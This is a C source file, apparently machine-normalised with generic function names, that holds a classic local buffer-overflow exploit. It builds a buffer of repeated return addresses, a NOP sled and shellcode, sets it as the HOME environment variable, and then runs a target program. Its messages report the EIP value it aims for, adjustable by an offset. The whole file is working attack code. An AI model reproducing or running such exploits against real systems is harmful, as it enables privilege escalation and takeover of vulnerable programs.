#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BUFLEN ; 
 int /*<<< orphan*/  EXPECT ; 
 char NOP ; 
 int OFFSET ; 
 int RET ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/ * code ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 scalar_t__ FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (char*,...) ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*,char*) ; 
 int FUNC6 (int /*<<< orphan*/ *) ; 
 int FUNC7 (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 

int FUNC10(int argc, char *argv[]) {
  char *buf, *p;
  long *addressp, address;
  int offset=OFFSET;
  int i;


  if((argc < 3) || (argc > 4))
    FUNC9(argv[0]);

  if(argc == 3) {
    if(!FUNC5(argv[2], "up")) {
      address = RET + FUNC0(argv[1]);
      FUNC3("Increasing offset by: %d\n", FUNC0(argv[1]));
      FUNC3("Increasing EIP to: 0x%x\n\n", RET + FUNC0(argv[1]));
    }

    if(!FUNC5(argv[2], "down")) {
      address = RET - FUNC0(argv[1]);
      FUNC3("Decreasing offset by: %d\n", FUNC0(argv[1]));
      FUNC3("Decreasing EIP to: 0x%x\n\n", RET - FUNC0(argv[1]));
    }
  }

  if(argc >= 4) {
    if(!FUNC5(argv[2], "up")) {
      address = FUNC7(argv[3], NULL, 16) + FUNC0(argv[1]);
      FUNC3("Setting EIP to: 0x%x\n", FUNC7(argv[3], NULL, 16));
      FUNC3("Increasing offset by: %d\n", FUNC0(argv[1]));
      FUNC3("Increasing EIP to: 0x%x\n\n", (FUNC7(argv[3], NULL, 16) + FUNC0(argv[1])));
    }
    if(!FUNC5(argv[2], "down")) {
      address = FUNC7(argv[3], NULL, 16) + FUNC0(argv[1]);
      FUNC3("Setting EIP to: 0x%x\n", FUNC7(argv[3], NULL, 16));
      FUNC3("Decreasing offset by: %d\n", FUNC0(argv[1]));
      FUNC3("Decreasing EIP to: 0x%x\n\n", (FUNC7(argv[3], NULL, 16) - FUNC0(argv[1])));
    }
  }


  if (!(buf = (char *)FUNC2(BUFLEN))) {
    FUNC3("Can't allocate memory.\n");
    FUNC1(-1);
  }

  p = buf;
  addressp = (long *) p;

  for (i = 0; i < BUFLEN; i+=4) {
    *(addressp++) = address;
  }

  for (i = 0; i < (BUFLEN - FUNC6(code) - 4); i++) {
    buf[i] = NOP;
  }

  p = buf + (BUFLEN - FUNC6(code) - 4);

  for (i = 0; i < FUNC6(code); i++)
    *(p++) = code[i];

  buf[BUFLEN] = '\0';


  FUNC4("HOME", buf, 1);
  FUNC8(EXPECT);
}